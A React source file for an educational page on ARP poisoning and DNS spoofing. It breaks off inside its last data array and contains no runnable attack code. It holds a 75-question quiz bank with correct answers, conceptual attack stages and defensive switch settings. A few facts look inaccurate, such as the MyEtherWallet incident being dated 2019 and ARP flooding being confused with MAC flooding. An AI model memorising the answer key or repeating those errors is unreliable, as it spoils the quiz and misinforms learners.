import React, { useState, useEffect } from "react";
import {
  Box,
  Button,
  Container,
  Typography,
  Paper,
  Chip,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  IconButton,
  Tooltip,
  Alert,
  AlertTitle,
  Divider,
  Drawer,
  Fab,
  LinearProgress,
  useMediaQuery,
  alpha,
  useTheme,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import DnsIcon from "@mui/icons-material/Dns";
import WifiIcon from "@mui/icons-material/Wifi";
import SecurityIcon from "@mui/icons-material/Security";
import WarningIcon from "@mui/icons-material/Warning";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import ShieldIcon from "@mui/icons-material/Shield";
import SearchIcon from "@mui/icons-material/Search";
import SchoolIcon from "@mui/icons-material/School";
import InfoIcon from "@mui/icons-material/Info";
import HistoryIcon from "@mui/icons-material/History";
import BugReportIcon from "@mui/icons-material/BugReport";
import TerminalIcon from "@mui/icons-material/Terminal";
import SettingsIcon from "@mui/icons-material/Settings";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import BuildIcon from "@mui/icons-material/Build";
import VisibilityIcon from "@mui/icons-material/Visibility";
import GavelIcon from "@mui/icons-material/Gavel";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import QuizIcon from "@mui/icons-material/Quiz";
import RouterIcon from "@mui/icons-material/Router";
import DevicesIcon from "@mui/icons-material/Devices";
import StorageIcon from "@mui/icons-material/Storage";
import LockIcon from "@mui/icons-material/Lock";
import SpeedIcon from "@mui/icons-material/Speed";
import AccountTreeIcon from "@mui/icons-material/AccountTree";
import PsychologyIcon from "@mui/icons-material/Psychology";
import { Link, useNavigate } from "react-router-dom";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";

// ==================== CONSTANTS ====================
const ACCENT_COLOR = "#0ea5e9";
const QUIZ_QUESTION_COUNT = 10;

// ==================== CODE BLOCK COMPONENT ====================
const CodeBlock: React.FC<{ code: string; language?: string }> = ({
  code,
  language = "bash",
}) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: "#0f172a",
        borderRadius: 2,
        position: "relative",
        my: 2,
        border: `1px solid ${alpha(ACCENT_COLOR, 0.3)}`,
      }}
    >
      <Box sx={{ position: "absolute", top: 8, right: 8, display: "flex", gap: 1 }}>
        <Chip label={language} size="small" sx={{ bgcolor: ACCENT_COLOR, color: "#0f172a", fontWeight: 600 }} />
        <Tooltip title={copied ? "Copied!" : "Copy"}>
          <IconButton size="small" onClick={handleCopy} sx={{ color: "#e2e8f0" }}>
            <ContentCopyIcon fontSize="small" />
          </IconButton>
        </Tooltip>
      </Box>
      <Box
        component="pre"
        sx={{
          m: 0,
          overflow: "auto",
          fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
          fontSize: "0.85rem",
          color: "#e2e8f0",
          pt: 3,
          lineHeight: 1.6,
        }}
      >
        {code}
      </Box>
    </Paper>
  );
};

// ==================== HELPER FUNCTION ====================
function selectRandomQuestions(questions: QuizQuestion[], count: number): QuizQuestion[] {
  const shuffled = [...questions].sort(() => Math.random() - 0.5);
  return shuffled.slice(0, Math.min(count, questions.length));
}

// ==================== 75-QUESTION QUIZ BANK ====================
const quizQuestions: QuizQuestion[] = [
  // ARP Fundamentals (Questions 1-15)
  {
    id: 1,
    question: "What does ARP stand for?",
    options: [
      "Address Resolution Protocol",
      "Advanced Routing Protocol",
      "Automated Request Protocol",
      "Application Resource Protocol"
    ],
    correctAnswer: 0,
    explanation: "ARP stands for Address Resolution Protocol, which maps IP addresses to MAC addresses on a local network."
  },
  {
    id: 2,
    question: "At which layer of the OSI model does ARP operate?",
    options: [
      "Network Layer (Layer 3)",
      "Data Link Layer (Layer 2)",
      "Transport Layer (Layer 4)",
      "Between Layer 2 and Layer 3"
    ],
    correctAnswer: 3,
    explanation: "ARP operates between the Data Link Layer (Layer 2) and Network Layer (Layer 3), translating between IP and MAC addresses."
  },
  {
    id: 3,
    question: "What is the broadcast MAC address used in ARP requests?",
    options: [
      "00:00:00:00:00:00",
      "FF:FF:FF:FF:FF:FF",
      "01:00:5E:00:00:00",
      "33:33:00:00:00:01"
    ],
    correctAnswer: 1,
    explanation: "ARP requests are sent to the broadcast MAC address FF:FF:FF:FF:FF:FF so all devices on the local network receive them."
  },
  {
    id: 4,
    question: "How long do ARP cache entries typically remain valid?",
    options: [
      "Forever until manually cleared",
      "A few minutes to several hours depending on OS",
      "Exactly 24 hours",
      "Until the next reboot only"
    ],
    correctAnswer: 1,
    explanation: "ARP cache entries have a timeout period that varies by operating system, typically ranging from 2 minutes to several hours."
  },
  {
    id: 5,
    question: "What type of ARP message is sent when a device needs to find a MAC address?",
    options: [
      "ARP Reply",
      "ARP Request",
      "ARP Announcement",
      "ARP Probe"
    ],
    correctAnswer: 1,
    explanation: "An ARP Request is broadcast when a device needs to discover the MAC address associated with an IP address."
  },
  {
    id: 6,
    question: "What is a Gratuitous ARP?",
    options: [
      "An ARP request for another device's IP",
      "An ARP reply without a prior request",
      "An ARP request/reply where source and destination IP are the same",
      "A malicious ARP packet"
    ],
    correctAnswer: 2,
    explanation: "A Gratuitous ARP is an ARP packet where the source and destination IP are the same, used to announce presence or detect IP conflicts."
  },
  {
    id: 7,
    question: "Which command displays the ARP cache on Windows?",
    options: [
      "ip neigh show",
      "arp -a",
      "netstat -arp",
      "show arp"
    ],
    correctAnswer: 1,
    explanation: "The 'arp -a' command displays the ARP cache on Windows, showing IP-to-MAC address mappings."
  },
  {
    id: 8,
    question: "What is the primary security weakness of ARP?",
    options: [
      "It uses weak encryption",
      "It has no built-in authentication mechanism",
      "It requires a password to function",
      "It only works over wireless networks"
    ],
    correctAnswer: 1,
    explanation: "ARP has no authentication mechanism - devices accept ARP replies without verifying the sender's identity, making spoofing possible."
  },
  {
    id: 9,
    question: "In an ARP poisoning attack, what does the attacker typically claim to be?",
    options: [
      "A DNS server",
      "The default gateway or another target host",
      "A DHCP server",
      "An external web server"
    ],
    correctAnswer: 1,
    explanation: "Attackers typically claim to be the default gateway to intercept traffic destined for the internet, enabling man-in-the-middle attacks."
  },
  {
    id: 10,
    question: "What is the purpose of an ARP Probe?",
    options: [
      "To attack other devices",
      "To check if an IP address is already in use",
      "To encrypt ARP traffic",
      "To route packets between networks"
    ],
    correctAnswer: 1,
    explanation: "ARP Probes are used during address configuration to check if an IP address is already in use on the network."
  },
  {
    id: 11,
    question: "Which protocol is the IPv6 equivalent of ARP?",
    options: [
      "ARPv6",
      "Neighbor Discovery Protocol (NDP)",
      "ICMPv6",
      "DHCPv6"
    ],
    correctAnswer: 1,
    explanation: "IPv6 uses Neighbor Discovery Protocol (NDP) instead of ARP to perform address resolution functions."
  },
  {
    id: 12,
    question: "What happens when a device receives multiple ARP replies for the same IP?",
    options: [
      "It ignores all of them",
      "It uses the first reply received",
      "It typically uses the last reply received",
      "It requests administrator approval"
    ],
    correctAnswer: 2,
    explanation: "Most operating systems update their ARP cache with the most recent reply, which attackers exploit to overwrite legitimate entries."
  },
  {
    id: 13,
    question: "What is ARP cache poisoning also known as?",
    options: [
      "MAC flooding",
      "ARP spoofing",
      "DHCP starvation",
      "VLAN hopping"
    ],
    correctAnswer: 1,
    explanation: "ARP cache poisoning is also commonly called ARP spoofing, as it involves sending falsified ARP messages."
  },
  {
    id: 14,
    question: "Which field in an Ethernet frame does ARP help populate?",
    options: [
      "Source IP address",
      "Destination MAC address",
      "TTL value",
      "Checksum"
    ],
    correctAnswer: 1,
    explanation: "ARP helps a device determine the destination MAC address to use in the Ethernet frame header when sending to a local IP."
  },
  {
    id: 15,
    question: "What is the ARP operation code for a request?",
    options: [
      "0",
      "1",
      "2",
      "3"
    ],
    correctAnswer: 1,
    explanation: "ARP requests have an operation code of 1, while ARP replies have an operation code of 2."
  },

  // DNS Fundamentals (Questions 16-30)
  {
    id: 16,
    question: "What does DNS stand for?",
    options: [
      "Domain Name System",
      "Dynamic Network Service",
      "Distributed Naming Standard",
      "Data Network Security"
    ],
    correctAnswer: 0,
    explanation: "DNS stands for Domain Name System, which translates human-readable domain names to IP addresses."
  },
  {
    id: 17,
    question: "Which port does DNS typically use?",
    options: [
      "Port 80",
      "Port 443",
      "Port 53",
      "Port 25"
    ],
    correctAnswer: 2,
    explanation: "DNS uses port 53 for both UDP (standard queries) and TCP (zone transfers and large responses)."
  },
  {
    id: 18,
    question: "What type of DNS record maps a domain name to an IPv4 address?",
    options: [
      "AAAA record",
      "A record",
      "CNAME record",
      "MX record"
    ],
    correctAnswer: 1,
    explanation: "An A record (Address record) maps a domain name to an IPv4 address."
  },
  {
    id: 19,
    question: "What is a DNS resolver?",
    options: [
      "A device that stores domain registrations",
      "A server that performs DNS lookups on behalf of clients",
      "A firewall that blocks DNS traffic",
      "A tool for registering new domains"
    ],
    correctAnswer: 1,
    explanation: "A DNS resolver (or recursive resolver) performs DNS lookups on behalf of clients, querying authoritative servers as needed."
  },
  {
    id: 20,
    question: "What does TTL stand for in DNS?",
    options: [
      "Total Transfer Length",
      "Time To Live",
      "Transmission Time Limit",
      "Type Table Lookup"
    ],
    correctAnswer: 1,
    explanation: "TTL (Time To Live) specifies how long a DNS record should be cached before being refreshed."
  },
  {
    id: 21,
    question: "What is DNS cache poisoning?",
    options: [
      "Encrypting DNS traffic",
      "Inserting false DNS records into a resolver's cache",
      "Deleting DNS records from a server",
      "Compressing DNS responses"
    ],
    correctAnswer: 1,
    explanation: "DNS cache poisoning involves inserting false DNS records into a resolver's cache, redirecting users to attacker-controlled servers."
  },
  {
    id: 22,
    question: "What is DNSSEC?",
    options: [
      "A DNS encryption protocol",
      "A VPN for DNS traffic",
      "DNS Security Extensions for authenticating DNS responses",
      "A firewall for DNS servers"
    ],
    correctAnswer: 2,
    explanation: "DNSSEC (DNS Security Extensions) adds digital signatures to DNS records to verify their authenticity and prevent tampering."
  },
  {
    id: 23,
    question: "What type of DNS record specifies mail servers for a domain?",
    options: [
      "A record",
      "CNAME record",
      "MX record",
      "NS record"
    ],
    correctAnswer: 2,
    explanation: "MX (Mail Exchange) records specify the mail servers responsible for receiving email for a domain."
  },
  {
    id: 24,
    question: "What is the famous 2008 DNS vulnerability called?",
    options: [
      "Heartbleed",
      "Shellshock",
      "Kaminsky attack",
      "POODLE"
    ],
    correctAnswer: 2,
    explanation: "The Kaminsky attack, discovered by Dan Kaminsky in 2008, exploited weaknesses in DNS transaction IDs to poison DNS caches."
  },
  {
    id: 25,
    question: "What is DNS amplification?",
    options: [
      "Making DNS queries faster",
      "A DDoS attack using DNS servers to amplify traffic",
      "Increasing DNS cache size",
      "Encrypting DNS responses"
    ],
    correctAnswer: 1,
    explanation: "DNS amplification is a DDoS attack where attackers use DNS servers to amplify traffic directed at a victim."
  },
  {
    id: 26,
    question: "What does DoH stand for?",
    options: [
      "Domain over HTTP",
      "DNS over HTTPS",
      "Data over Hypertext",
      "Direct over Host"
    ],
    correctAnswer: 1,
    explanation: "DoH (DNS over HTTPS) encrypts DNS queries using HTTPS to prevent eavesdropping and manipulation."
  },
  {
    id: 27,
    question: "What is the root zone in DNS?",
    options: [
      "The first DNS server to receive a query",
      "The top of the DNS hierarchy, denoted by a dot",
      "A backup DNS server",
      "The local DNS cache"
    ],
    correctAnswer: 1,
    explanation: "The root zone is the top of the DNS hierarchy, represented by a dot (.), managed by root name servers."
  },
  {
    id: 28,
    question: "What command queries DNS on Linux?",
    options: [
      "nslookup only",
      "dig",
      "dns-query",
      "resolve"
    ],
    correctAnswer: 1,
    explanation: "The 'dig' command is the standard DNS lookup utility on Linux, providing detailed query results."
  },
  {
    id: 29,
    question: "What is a DNS zone transfer?",
    options: [
      "Moving DNS servers to a new location",
      "Copying DNS records from one server to another",
      "Encrypting DNS traffic",
      "Blocking DNS queries"
    ],
    correctAnswer: 1,
    explanation: "A DNS zone transfer (AXFR) copies DNS records from a primary to secondary server for redundancy."
  },
  {
    id: 30,
    question: "What type of DNS record creates an alias for another domain?",
    options: [
      "A record",
      "CNAME record",
      "PTR record",
      "SOA record"
    ],
    correctAnswer: 1,
    explanation: "A CNAME (Canonical Name) record creates an alias that points to another domain name."
  },

  // ARP Poisoning Attacks (Questions 31-45)
  {
    id: 31,
    question: "What is the primary goal of ARP poisoning in most attacks?",
    options: [
      "Crash the network",
      "Enable man-in-the-middle interception",
      "Speed up network traffic",
      "Improve security"
    ],
    correctAnswer: 1,
    explanation: "ARP poisoning is primarily used to enable man-in-the-middle attacks by redirecting traffic through the attacker's machine."
  },
  {
    id: 32,
    question: "Which tool is commonly associated with ARP spoofing attacks?",
    options: [
      "Nmap",
      "Wireshark",
      "Ettercap",
      "Metasploit"
    ],
    correctAnswer: 2,
    explanation: "Ettercap is a well-known tool for performing ARP spoofing and man-in-the-middle attacks on LANs."
  },
  {
    id: 33,
    question: "What must an attacker be on the same network segment to perform?",
    options: [
      "SQL injection",
      "ARP poisoning",
      "Remote code execution",
      "Cross-site scripting"
    ],
    correctAnswer: 1,
    explanation: "ARP operates only on the local network segment, so attackers must be on the same LAN to perform ARP poisoning."
  },
  {
    id: 34,
    question: "During ARP poisoning, which systems typically need to be poisoned?",
    options: [
      "Only the target",
      "Only the gateway",
      "Both the target and the gateway",
      "All devices on the network"
    ],
    correctAnswer: 2,
    explanation: "For full MITM, both the target (to redirect its gateway traffic) and the gateway (to redirect return traffic) need poisoning."
  },
  {
    id: 35,
    question: "What feature must be enabled on the attacker's machine for traffic forwarding?",
    options: [
      "DHCP",
      "IP forwarding",
      "DNS resolution",
      "Port mirroring"
    ],
    correctAnswer: 1,
    explanation: "IP forwarding must be enabled so the attacker's machine forwards intercepted packets to their intended destination."
  },
  {
    id: 36,
    question: "What is the effect of ARP poisoning on network performance?",
    options: [
      "Always improves speed",
      "No effect at all",
      "Can cause latency and potential packet loss",
      "Only affects wireless networks"
    ],
    correctAnswer: 2,
    explanation: "ARP poisoning routes traffic through an additional hop, potentially causing latency, and if misconfigured, packet loss."
  },
  {
    id: 37,
    question: "What type of attack can ARP poisoning enable against HTTPS traffic?",
    options: [
      "Direct decryption",
      "SSL stripping",
      "Port scanning",
      "Buffer overflow"
    ],
    correctAnswer: 1,
    explanation: "ARP poisoning can enable SSL stripping attacks, where HTTPS connections are downgraded to HTTP."
  },
  {
    id: 38,
    question: "How often must an attacker send spoofed ARP packets?",
    options: [
      "Only once",
      "Periodically to maintain the poisoned cache",
      "Every second",
      "Only when new devices join"
    ],
    correctAnswer: 1,
    explanation: "Spoofed ARP packets must be sent periodically because ARP cache entries expire and legitimate ARP traffic can restore them."
  },
  {
    id: 39,
    question: "What is ARP flooding?",
    options: [
      "Sending many ARP packets to overflow switch MAC tables",
      "A type of DNS attack",
      "Encrypting ARP traffic",
      "Blocking all ARP requests"
    ],
    correctAnswer: 0,
    explanation: "ARP flooding sends massive numbers of ARP packets to overflow switch MAC address tables, potentially causing broadcast storms."
  },
  {
    id: 40,
    question: "Which layer 2 attack is closely related to ARP spoofing?",
    options: [
      "SQL injection",
      "MAC spoofing",
      "DNS hijacking",
      "XSS attacks"
    ],
    correctAnswer: 1,
    explanation: "MAC spoofing is closely related as both involve manipulating layer 2 addressing to redirect or impersonate network traffic."
  },
  {
    id: 41,
    question: "What happens if IP forwarding is not enabled during ARP poisoning?",
    options: [
      "The attack works faster",
      "Traffic is intercepted and dropped, causing DoS",
      "Nothing changes",
      "The attack is more stealthy"
    ],
    correctAnswer: 1,
    explanation: "Without IP forwarding, intercepted packets are not forwarded, effectively causing a denial of service."
  },
  {
    id: 42,
    question: "What credential type is most vulnerable to ARP MITM attacks?",
    options: [
      "Encrypted passwords only",
      "Plaintext protocols like HTTP, FTP, Telnet",
      "SSH keys",
      "Hardware tokens"
    ],
    correctAnswer: 1,
    explanation: "Credentials sent over plaintext protocols can be captured directly, while encrypted protocols require additional attacks."
  },
  {
    id: 43,
    question: "What is 'ARP announcement' used for legitimately?",
    options: [
      "Attacking networks",
      "Updating other hosts when an IP/MAC binding changes",
      "Encrypting traffic",
      "Blocking rogue devices"
    ],
    correctAnswer: 1,
    explanation: "ARP announcements legitimately inform other hosts of IP/MAC changes, such as during failover scenarios."
  },
  {
    id: 44,
    question: "Which attack combines ARP poisoning with DNS spoofing?",
    options: [
      "Pharming",
      "Phishing",
      "MITM with selective redirection",
      "SQL injection"
    ],
    correctAnswer: 2,
    explanation: "Combining ARP poisoning with DNS spoofing allows attackers to redirect specific domain requests while forwarding other traffic."
  },
  {
    id: 45,
    question: "What makes wireless networks particularly vulnerable to ARP attacks?",
    options: [
      "Higher bandwidth",
      "All clients share the same broadcast domain",
      "Stronger encryption",
      "Shorter range"
    ],
    correctAnswer: 1,
    explanation: "Wireless networks place all connected clients in the same broadcast domain, making ARP attacks easier to execute."
  },

  // DNS Attacks (Questions 46-60)
  {
    id: 46,
    question: "What is pharming?",
    options: [
      "Growing malware",
      "Redirecting users to fake websites via DNS manipulation",
      "A type of phishing email",
      "Harvesting passwords"
    ],
    correctAnswer: 1,
    explanation: "Pharming redirects users to fraudulent websites by manipulating DNS resolution, either through cache poisoning or hosts file modification."
  },
  {
    id: 47,
    question: "What made the Kaminsky DNS attack so dangerous?",
    options: [
      "It worked remotely without network access",
      "It allowed poisoning any domain, not just the queried one",
      "It deleted DNS records",
      "It only affected Windows"
    ],
    correctAnswer: 1,
    explanation: "The Kaminsky attack could poison cache entries for any domain by exploiting the bailiwick check, not just the directly queried domain."
  },
  {
    id: 48,
    question: "What is DNS hijacking at the router level?",
    options: [
      "Changing DHCP settings to point to malicious DNS",
      "Breaking router hardware",
      "Encrypting DNS traffic",
      "Blocking all DNS queries"
    ],
    correctAnswer: 0,
    explanation: "Router-level DNS hijacking involves changing DHCP settings to distribute malicious DNS server addresses to all clients."
  },
  {
    id: 49,
    question: "What is a DNS rebinding attack?",
    options: [
      "Restarting DNS servers",
      "Manipulating DNS TTL to access internal resources",
      "Copying DNS zones",
      "Encrypting DNS queries"
    ],
    correctAnswer: 1,
    explanation: "DNS rebinding manipulates DNS responses to trick browsers into accessing internal network resources from external websites."
  },
  {
    id: 50,
    question: "What is the purpose of randomizing DNS source ports?",
    options: [
      "Faster queries",
      "Making cache poisoning harder to execute",
      "Encryption",
      "Load balancing"
    ],
    correctAnswer: 1,
    explanation: "Source port randomization increases the difficulty of cache poisoning by adding more bits the attacker must guess."
  },
  {
    id: 51,
    question: "What is DNS tunneling?",
    options: [
      "Encrypting DNS traffic",
      "Using DNS queries/responses to exfiltrate data",
      "Creating VPN over DNS",
      "Compressing DNS packets"
    ],
    correctAnswer: 1,
    explanation: "DNS tunneling encodes data in DNS queries and responses to exfiltrate data or establish covert communication channels."
  },
  {
    id: 52,
    question: "What is a rogue DNS server?",
    options: [
      "A misconfigured legitimate server",
      "A malicious server providing false DNS responses",
      "A backup DNS server",
      "An encrypted DNS server"
    ],
    correctAnswer: 1,
    explanation: "A rogue DNS server is set up by attackers to provide false DNS responses, redirecting victims to malicious sites."
  },
  {
    id: 53,
    question: "What NXDOMAIN hijacking involves?",
    options: [
      "Redirecting non-existent domain queries to attacker pages",
      "Blocking all DNS queries",
      "Creating new domains",
      "Encrypting failed queries"
    ],
    correctAnswer: 0,
    explanation: "NXDOMAIN hijacking intercepts queries for non-existent domains and redirects them to advertising or phishing pages."
  },
  {
    id: 54,
    question: "How does DNS spoofing differ from DNS cache poisoning?",
    options: [
      "They are the same thing",
      "Spoofing targets individual queries; poisoning corrupts cached data",
      "Spoofing is legal; poisoning is not",
      "Spoofing is faster"
    ],
    correctAnswer: 1,
    explanation: "DNS spoofing intercepts and replies to specific queries, while cache poisoning corrupts stored records affecting future lookups."
  },
  {
    id: 55,
    question: "What is the birthday attack in DNS context?",
    options: [
      "Attacking on someone's birthday",
      "Exploiting probability to guess transaction IDs",
      "A social engineering attack",
      "Celebrating server uptime"
    ],
    correctAnswer: 1,
    explanation: "The birthday attack exploits probability theory to increase chances of guessing DNS transaction IDs for cache poisoning."
  },
  {
    id: 56,
    question: "What file can be modified locally for DNS-like attacks?",
    options: [
      "/etc/passwd",
      "/etc/hosts",
      "/etc/shadow",
      "/etc/resolv.conf"
    ],
    correctAnswer: 1,
    explanation: "The /etc/hosts file (or Windows equivalent) can be modified to redirect specific domain names to attacker-controlled IPs."
  },
  {
    id: 57,
    question: "What is response rate limiting (RRL) in DNS?",
    options: [
      "Slowing down all queries",
      "Limiting identical responses to prevent amplification attacks",
      "Encrypting responses",
      "Caching more aggressively"
    ],
    correctAnswer: 1,
    explanation: "RRL limits the rate of identical responses to reduce the effectiveness of DNS amplification attacks."
  },
  {
    id: 58,
    question: "What type of DNS record is often abused in DNS tunneling?",
    options: [
      "A records only",
      "TXT records",
      "MX records only",
      "SOA records"
    ],
    correctAnswer: 1,
    explanation: "TXT records are commonly used in DNS tunneling because they can contain arbitrary text data."
  },
  {
    id: 59,
    question: "What is DNS reflection?",
    options: [
      "Mirroring DNS servers",
      "Using DNS servers to reflect traffic to a victim",
      "Copying DNS responses",
      "Reversing DNS queries"
    ],
    correctAnswer: 1,
    explanation: "DNS reflection sends spoofed queries to DNS servers, which then send responses to the spoofed victim IP."
  },
  {
    id: 60,
    question: "What makes open DNS resolvers dangerous?",
    options: [
      "They don't cache responses",
      "They can be abused for amplification attacks",
      "They use encryption",
      "They are always malicious"
    ],
    correctAnswer: 1,
    explanation: "Open resolvers accept queries from anyone and can be exploited for DNS amplification DDoS attacks."
  },

  // Detection & Defense (Questions 61-75)
  {
    id: 61,
    question: "What is Dynamic ARP Inspection (DAI)?",
    options: [
      "A penetration testing tool",
      "A switch feature that validates ARP packets against DHCP snooping database",
      "An encryption protocol",
      "A type of firewall"
    ],
    correctAnswer: 1,
    explanation: "DAI is a security feature on managed switches that validates ARP packets against the DHCP snooping binding table."
  },
  {
    id: 62,
    question: "What is DHCP snooping?",
    options: [
      "Spying on DHCP traffic",
      "A switch security feature that filters untrusted DHCP messages",
      "A DHCP encryption method",
      "A type of DHCP attack"
    ],
    correctAnswer: 1,
    explanation: "DHCP snooping builds a binding database of IP-MAC-port associations and blocks rogue DHCP servers."
  },
  {
    id: 63,
    question: "What is IP Source Guard?",
    options: [
      "A firewall rule",
      "A switch feature that prevents IP spoofing using DHCP snooping data",
      "An encryption protocol",
      "A VPN technology"
    ],
    correctAnswer: 1,
    explanation: "IP Source Guard uses the DHCP snooping binding table to filter packets with spoofed source IP addresses."
  },
  {
    id: 64,
    question: "What does ARP watch/monitoring software detect?",
    options: [
      "Only hardware failures",
      "Changes in ARP mappings that may indicate poisoning",
      "DNS queries",
      "Firewall rules"
    ],
    correctAnswer: 1,
    explanation: "ARP monitoring tools detect changes in IP-MAC mappings, alerting administrators to potential ARP spoofing attacks."
  },
  {
    id: 65,
    question: "What is port security on a switch?",
    options: [
      "Locking physical ports",
      "Limiting the number of MAC addresses per port",
      "Encrypting port traffic",
      "Blocking specific ports"
    ],
    correctAnswer: 1,
    explanation: "Port security limits the number of MAC addresses allowed on a switch port, helping prevent MAC flooding attacks."
  },
  {
    id: 66,
    question: "How do static ARP entries help prevent poisoning?",
    options: [
      "They encrypt traffic",
      "They cannot be overwritten by ARP replies",
      "They speed up networking",
      "They block all ARP traffic"
    ],
    correctAnswer: 1,
    explanation: "Static ARP entries are manually configured and don't get updated by dynamic ARP, preventing poisoning of critical mappings."
  },
  {
    id: 67,
    question: "What DNSSEC record type contains digital signatures?",
    options: [
      "A record",
      "RRSIG record",
      "MX record",
      "PTR record"
    ],
    correctAnswer: 1,
    explanation: "RRSIG (Resource Record Signature) records contain digital signatures used to authenticate other DNS records."
  },
  {
    id: 68,
    question: "What is a DNS sinkhole?",
    options: [
      "A failed DNS server",
      "Redirecting malicious domains to a controlled server",
      "Deleting DNS records",
      "A type of DNS attack"
    ],
    correctAnswer: 1,
    explanation: "A DNS sinkhole redirects queries for known malicious domains to a controlled server for blocking or analysis."
  },
  {
    id: 69,
    question: "What network architecture limits ARP poisoning scope?",
    options: [
      "Flat network",
      "Network segmentation with VLANs",
      "Wireless only",
      "Single subnet design"
    ],
    correctAnswer: 1,
    explanation: "Network segmentation with VLANs limits the broadcast domain, containing ARP poisoning to smaller network segments."
  },
  {
    id: 70,
    question: "What tool can detect ARP spoofing on a network?",
    options: [
      "Only expensive commercial products",
      "arpwatch, XArp, or similar monitoring tools",
      "Standard antivirus",
      "Web browsers"
    ],
    correctAnswer: 1,
    explanation: "Tools like arpwatch, XArp, and similar utilities monitor ARP traffic and alert on suspicious changes."
  },
  {
    id: 71,
    question: "What is the benefit of using encrypted DNS (DoH/DoT)?",
    options: [
      "Faster resolution",
      "Prevents eavesdropping and tampering of DNS queries",
      "Cheaper bandwidth",
      "Simpler configuration"
    ],
    correctAnswer: 1,
    explanation: "Encrypted DNS (DoH/DoT) prevents network observers from seeing or modifying DNS queries in transit."
  },
  {
    id: 72,
    question: "What should you do if you detect ARP poisoning?",
    options: [
      "Ignore it",
      "Isolate affected segments and investigate the source",
      "Restart all computers",
      "Disable the internet"
    ],
    correctAnswer: 1,
    explanation: "Proper response includes isolating affected network segments, identifying the poisoning source, and implementing controls."
  },
  {
    id: 73,
    question: "What is 802.1X authentication?",
    options: [
      "A wireless encryption standard",
      "Port-based network access control",
      "A VPN protocol",
      "A firewall type"
    ],
    correctAnswer: 1,
    explanation: "802.1X provides port-based access control, requiring authentication before network access, limiting unauthorized device connection."
  },
  {
    id: 74,
    question: "Why should DNS servers be patched regularly?",
    options: [
      "For new features only",
      "To fix vulnerabilities that could enable cache poisoning",
      "To change colors",
      "Patches are optional"
    ],
    correctAnswer: 1,
    explanation: "DNS software patches fix security vulnerabilities that could be exploited for cache poisoning and other attacks."
  },
  {
    id: 75,
    question: "What is the purpose of monitoring DNS query patterns?",
    options: [
      "Billing purposes only",
      "Detecting anomalies that may indicate tunneling or poisoning",
      "Speeding up queries",
      "Marketing analysis"
    ],
    correctAnswer: 1,
    explanation: "Monitoring DNS patterns helps detect anomalies like unusual query volumes, tunneling attempts, or poisoning indicators."
  }
];

// ==================== DATA ====================
const arpAttackStages = [
  { stage: "Reconnaissance", description: "Attacker identifies target IP and gateway on the local network", icon: <SearchIcon /> },
  { stage: "ARP Cache Pollution", description: "Sends forged ARP replies claiming to be the gateway", icon: <WifiIcon /> },
  { stage: "Traffic Interception", description: "Victim's traffic now flows through attacker's machine", icon: <VisibilityIcon /> },
  { stage: "MITM Position", description: "Attacker can read, modify, or inject packets", icon: <BugReportIcon /> },
  { stage: "Data Exfiltration", description: "Credentials and sensitive data captured", icon: <StorageIcon /> },
];

const dnsAttackTypes = [
  { type: "Cache Poisoning", desc: "Corrupting resolver cache with false records", severity: "Critical", vector: "Network" },
  { type: "DNS Hijacking", desc: "Changing DNS settings on router or endpoint", severity: "High", vector: "Configuration" },
  { type: "DNS Spoofing", desc: "Responding to queries with false answers", severity: "High", vector: "Network" },
  { type: "DNS Tunneling", desc: "Exfiltrating data through DNS queries", severity: "Medium", vector: "Application" },
  { type: "DNS Rebinding", desc: "Bypassing same-origin policy via DNS", severity: "Medium", vector: "Browser" },
  { type: "DNS Amplification", desc: "DDoS using DNS for traffic amplification", severity: "High", vector: "Network" },
];

const toolsEducational = [
  { name: "Wireshark", purpose: "Packet capture and analysis - detect ARP anomalies", defensive: true },
  { name: "arpwatch", purpose: "Monitor ARP table changes and alert on modifications", defensive: true },
  { name: "XArp", purpose: "Advanced ARP spoofing detection for Windows", defensive: true },
  { name: "dnstop", purpose: "Display DNS traffic statistics in real-time", defensive: true },
  { name: "DNSSEC-Tools", purpose: "Suite for DNSSEC deployment and validation", defensive: true },
  { name: "Snort/Suricata", purpose: "IDS/IPS with ARP and DNS attack signatures", defensive: true },
];

const switchSecurityFeatures = [
  { feature: "DHCP Snooping", description: "Builds trusted IP-MAC-port database, blocks rogue DHCP", config: "ip dhcp snooping" },
  { feature: "Dynamic ARP Inspection", description: "Validates ARP against DHCP snooping table", config: "ip arp inspection" },
  { feature: "IP Source Guard", description: "Filters packets with spoofed source IPs", config: "ip verify source" },
  { feature: "Port Security", description: "Limits MAC addresses per port", config: "switchport port-security" },
  { feature: "Private VLANs", description: "Isolates traffic between hosts on same VLAN", config: "private-vlan" },
];

const realWorldIncidents = [
  { year: "2008", name: "Kaminsky DNS Vulnerability", impact: "Affected virtually all DNS implementations worldwide" },
  { year: "2010", name: "China DNS Hijacking", impact: "Major traffic redirection affecting global users" },
  { year: "2016", name: "Brazilian Bank Heist", impact: "DNS hijacking redirected customers to fake banking sites" },
  { year: "2018", name: "Sea Turtle Campaign", impact: "Nation-state DNS hijacking targeting Middle East" },
  { year: "2019", name: "MyEtherWallet DNS Hijack", impact: "BGP/DNS attack stole $150,000 in cryptocurrency" },
  { year: "2020", name: "SolarWinds + DNS", impact: "Used DNS for C2 communication in supply chain attack" },
];

const protocolComparison = [
  { protocol: "Standard DNS", port: "53/UDP", encryption: "None", mitm: "Vulnerable" },
  { protocol: "DNS over TLS (DoT)", port: "853/TCP", encryption: "TLS 1.3", mitm: "Protected" },
  { protocol: "DNS over HTTPS (DoH)", port: "443/TCP", encryption: "HTTPS/TLS", mitm: "Protected" },
  { protocol: "DNSCrypt", port: "443/UDP", encryption: "X25519-XSalsa20Poly1305", mitm: "Protected" },
